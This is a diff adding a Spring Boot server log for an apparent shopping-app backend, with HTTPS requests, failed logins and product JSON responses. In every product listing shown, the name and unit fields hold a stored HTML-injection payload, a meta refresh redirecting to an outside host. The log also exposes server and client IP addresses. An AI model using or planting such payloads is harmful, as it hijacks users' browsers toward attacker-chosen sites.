@@ -1,0 +1,327 @@
+2024-08-30 07:49:46 [main] INFO  org.hepi.hepi_sv.HepiSvApplication - Starting HepiSvApplication v0.0.1-SNAPSHOT using Java 17.0.11 with PID 149874 (/home/ubuntu/hepi/HEPI_SV.jar started by root in /home/ubuntu/hepi)
+2024-08-30 07:49:46 [main] INFO  org.hepi.hepi_sv.HepiSvApplication - No active profile set, falling back to 1 default profile: "default"
+2024-08-30 07:49:50 [main] INFO  o.s.b.w.e.tomcat.TomcatWebServer - Tomcat initialized with port 3573 (https)
+2024-08-30 07:49:50 [main] INFO  o.a.coyote.http11.Http11NioProtocol - Initializing ProtocolHandler ["https-jsse-nio-3573"]
+2024-08-30 07:49:50 [main] INFO  o.a.catalina.core.StandardService - Starting service [Tomcat]
+2024-08-30 07:49:50 [main] INFO  o.a.catalina.core.StandardEngine - Starting Servlet engine: [Apache Tomcat/10.1.20]
+2024-08-30 07:49:50 [main] INFO  o.a.c.c.C.[Tomcat].[localhost].[/] - Initializing Spring embedded WebApplicationContext
+2024-08-30 07:49:50 [main] INFO  o.s.b.w.s.c.ServletWebServerApplicationContext - Root WebApplicationContext: initialization completed in 4028 ms
+2024-08-30 07:49:52 [main] INFO  o.a.coyote.http11.Http11NioProtocol - Starting ProtocolHandler ["https-jsse-nio-3573"]
+2024-08-30 07:49:53 [main] INFO  o.a.t.u.net.NioEndpoint.certificate - Connector [https-jsse-nio-3573], TLS virtual host [_default_], certificate type [UNDEFINED] configured from keystore [/root/.keystore] using alias [mysslkey] with trust store [null]
+2024-08-30 07:49:53 [main] INFO  o.s.b.w.e.tomcat.TomcatWebServer - Tomcat started on port 3573 (https) with context path ''
+2024-08-30 07:49:53 [main] INFO  org.hepi.hepi_sv.HepiSvApplication - Started HepiSvApplication in 9.113 seconds (process running for 10.638)
+2024-08-30 07:49:53 [main] INFO  org.hepi.hepi_sv.HepiSvApplication - ==================== START HEPI SERVER ====================
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-7] INFO  o.a.c.c.C.[Tomcat].[localhost].[/] - Initializing Spring DispatcherServlet 'dispatcherServlet'
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-7] INFO  o.s.web.servlet.DispatcherServlet - Initializing Servlet 'dispatcherServlet'
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-7] INFO  o.s.web.servlet.DispatcherServlet - Completed initialization in 4 ms
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-7] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51898 
+Request URL: https://13.124.162.23:3573/flt/product/event 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 9
+host: 13.124.162.23:3573
+
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-10] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51899 
+Request URL: https://13.124.162.23:3573/flt/eventImage 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 0
+host: 13.124.162.23:3573
+
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-7] INFO  com.zaxxer.hikari.HikariDataSource - HikariPool-1 - Starting...
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-7] INFO  com.zaxxer.hikari.pool.HikariPool - HikariPool-1 - Added connection com.mysql.cj.jdbc.ConnectionImpl@489b627d
+2024-08-30 07:51:27 [https-jsse-nio-3573-exec-7] INFO  com.zaxxer.hikari.HikariDataSource - HikariPool-1 - Start completed.
+2024-08-30 07:51:28 [https-jsse-nio-3573-exec-10] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 200 
+[Headers]: 
+client-ip: 183.100.207.7:51899
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 320
+Date: Fri, 30 Aug 2024 07:51:28 GMT
+ 
+[Content]: 
+[ {
+  "id" : 1,
+  "url" : "https://drive.google.com/uc?export=view&id=1XbPY753nb7WlGYnU7mGUYGI4fCtNMX1Q"
+}, {
+  "id" : 2,
+  "url" : "https://drive.google.com/uc?export=view&id=1Sq4liCGQqv4yyc9FxOyJC4ybczVLCSHK"
+}, {
+  "id" : 3,
+  "url" : "https://drive.google.com/uc?export=view&id=1C6z-Dcxm5HkknxQiVyAQ859vaHZmMjBU"
+} ]
+
+2024-08-30 07:51:28 [https-jsse-nio-3573-exec-7] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 200 
+[Headers]: 
+client-ip: 183.100.207.7:51898
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 2449
+Date: Fri, 30 Aug 2024 07:51:28 GMT
+ 
+[Content]: 
+[ {
+  "id" : 1,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 40101,
+  "explain" : "California Gold Nutrition SPORT 분리유청단백질, 1lb\n단백질 27g, BCAA 6.1g, 글루탐산 4.6g\n무맛\n저유당\n재조합 소 성장호르몬 무함유\n근육 성장 증진\n증량제, 글루텐, 유전자 변형 성분, 대두 무함유\n인공 색소, 인공 향료, 인공 감미료 무함유\ncGMP 인증 시설에서 생산\n100% 골드 개런티(Gold Guarantee)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1LUwu6vdonubHkj4_EWs-NYsnyOdZSbA7",
+  "my_amount" : -1,
+  "amount" : 454,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 20
+}, {
+  "id" : 2,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 21502,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1hJymsu8GRTldhTJsO33FIJcnhIc2Is3s",
+  "my_amount" : -1,
+  "amount" : 300,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 30
+}, {
+  "id" : 3,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 122556,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1A99sQzMPS6i-wALOR0Zb8JoMxgWCtsbl",
+  "my_amount" : -1,
+  "amount" : 2270,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 40
+}, {
+  "id" : 5,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 33000,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=14Cfh0nFexizTlqBDS_cB5j36qUdREsLF",
+  "my_amount" : -1,
+  "amount" : 60,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 10
+}, {
+  "id" : 6,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 15000,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1cuE0yIXOMGkWJJAf5BDdyif-LZKL1B0p",
+  "my_amount" : -1,
+  "amount" : 100,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 50
+} ]
+
+2024-08-30 07:51:54 [https-jsse-nio-3573-exec-9] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51938 
+Request URL: https://13.124.162.23:3573/flt/login 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 47
+host: 13.124.162.23:3573
+
+2024-08-30 07:51:54 [https-jsse-nio-3573-exec-9] INFO  o.hepi.hepi_sv.service.LoginService - [Login] NOT EXIST E-MAIL | null
+2024-08-30 07:51:54 [https-jsse-nio-3573-exec-9] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 404 
+[Headers]: 
+client-ip: 183.100.207.7:51938
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Fri, 30 Aug 2024 07:51:54 GMT
+ 
+[Content]: 
+null
+
+2024-08-30 07:52:00 [https-jsse-nio-3573-exec-5] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51944 
+Request URL: https://13.124.162.23:3573/flt/login 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 48
+host: 13.124.162.23:3573
+
+2024-08-30 07:52:00 [https-jsse-nio-3573-exec-5] INFO  o.hepi.hepi_sv.service.LoginService - [Login] NOT EXIST E-MAIL | null
+2024-08-30 07:52:00 [https-jsse-nio-3573-exec-5] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 404 
+[Headers]: 
+client-ip: 183.100.207.7:51944
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Fri, 30 Aug 2024 07:52:00 GMT
+ 
+[Content]: 
+null
+
+2024-08-30 07:52:12 [https-jsse-nio-3573-exec-2] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51953 
+Request URL: https://13.124.162.23:3573/flt/login 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 47
+host: 13.124.162.23:3573
+
+2024-08-30 07:52:12 [https-jsse-nio-3573-exec-2] INFO  o.hepi.hepi_sv.service.LoginService - [Login] NOT EXIST E-MAIL | null
+2024-08-30 07:52:12 [https-jsse-nio-3573-exec-2] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 404 
+[Headers]: 
+client-ip: 183.100.207.7:51953
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Fri, 30 Aug 2024 07:52:12 GMT
+ 
+[Content]: 
+null
+
+2024-08-30 07:52:15 [https-jsse-nio-3573-exec-9] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51957 
+Request URL: https://13.124.162.23:3573/flt/login 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 48
+host: 13.124.162.23:3573
+
+2024-08-30 07:52:15 [https-jsse-nio-3573-exec-9] INFO  o.hepi.hepi_sv.service.LoginService - [Login] NOT EXIST E-MAIL | null
+2024-08-30 07:52:15 [https-jsse-nio-3573-exec-9] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 404 
+[Headers]: 
+client-ip: 183.100.207.7:51957
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Fri, 30 Aug 2024 07:52:15 GMT
+ 
+[Content]: 
+null
+
+2024-08-30 07:52:23 [https-jsse-nio-3573-exec-7] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51963 
+Request URL: https://13.124.162.23:3573/flt/product/event 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 9
+host: 13.124.162.23:3573
+
+2024-08-30 07:52:23 [https-jsse-nio-3573-exec-10] INFO  o.h.h.controller.FltInterceptor - ==================== REQUEST ====================
+Client IP: 183.100.207.7:51964 
+Request URL: https://13.124.162.23:3573/flt/eventImage 
+HTTP Method: POST 
+[Headers]: 
+user-agent: Dart/3.4 (dart:io)
+content-type: application/json; charset=UTF-8
+accept-encoding: gzip
+content-length: 0
+host: 13.124.162.23:3573
+
+2024-08-30 07:52:23 [https-jsse-nio-3573-exec-10] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 200 
+[Headers]: 
+client-ip: 183.100.207.7:51964
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 320
+Date: Fri, 30 Aug 2024 07:52:23 GMT
+ 
+[Content]: 
+[ {
+  "id" : 1,
+  "url" : "https://drive.google.com/uc?export=view&id=1XbPY753nb7WlGYnU7mGUYGI4fCtNMX1Q"
+}, {
+  "id" : 2,
+  "url" : "https://drive.google.com/uc?export=view&id=1Sq4liCGQqv4yyc9FxOyJC4ybczVLCSHK"
+}, {
+  "id" : 3,
+  "url" : "https://drive.google.com/uc?export=view&id=1C6z-Dcxm5HkknxQiVyAQ859vaHZmMjBU"
+} ]
+
+2024-08-30 07:52:23 [https-jsse-nio-3573-exec-7] INFO  o.h.h.controller.FltInterceptor - ==================== RESPONSE ====================
+Status: 200 
+[Headers]: 
+client-ip: 183.100.207.7:51963
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 2449
+Date: Fri, 30 Aug 2024 07:52:23 GMT
+ 
+[Content]: 
+[ {
+  "id" : 1,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 40101,
+  "explain" : "California Gold Nutrition SPORT 분리유청단백질, 1lb\n단백질 27g, BCAA 6.1g, 글루탐산 4.6g\n무맛\n저유당\n재조합 소 성장호르몬 무함유\n근육 성장 증진\n증량제, 글루텐, 유전자 변형 성분, 대두 무함유\n인공 색소, 인공 향료, 인공 감미료 무함유\ncGMP 인증 시설에서 생산\n100% 골드 개런티(Gold Guarantee)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1LUwu6vdonubHkj4_EWs-NYsnyOdZSbA7",
+  "my_amount" : -1,
+  "amount" : 454,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 20
+}, {
+  "id" : 2,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 21502,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1hJymsu8GRTldhTJsO33FIJcnhIc2Is3s",
+  "my_amount" : -1,
+  "amount" : 300,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 30
+}, {
+  "id" : 3,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 122556,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1A99sQzMPS6i-wALOR0Zb8JoMxgWCtsbl",
+  "my_amount" : -1,
+  "amount" : 2270,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 40
+}, {
+  "id" : 5,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 33000,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=14Cfh0nFexizTlqBDS_cB5j36qUdREsLF",
+  "my_amount" : -1,
+  "amount" : 60,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 10
+}, {
+  "id" : 6,
+  "name" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "price" : 15000,
+  "explain" : "(상품설명)",
+  "event" : 1,
+  "main_image" : "https://drive.google.com/uc?export=view&id=1cuE0yIXOMGkWJJAf5BDdyif-LZKL1B0p",
+  "my_amount" : -1,
+  "amount" : 100,
+  "unit" : "'\"\\><meta http-equiv=\"refresh\" content=\"0;url=http://ie33.a0001.net\">",
+  "discount" : 50
+} ]
+
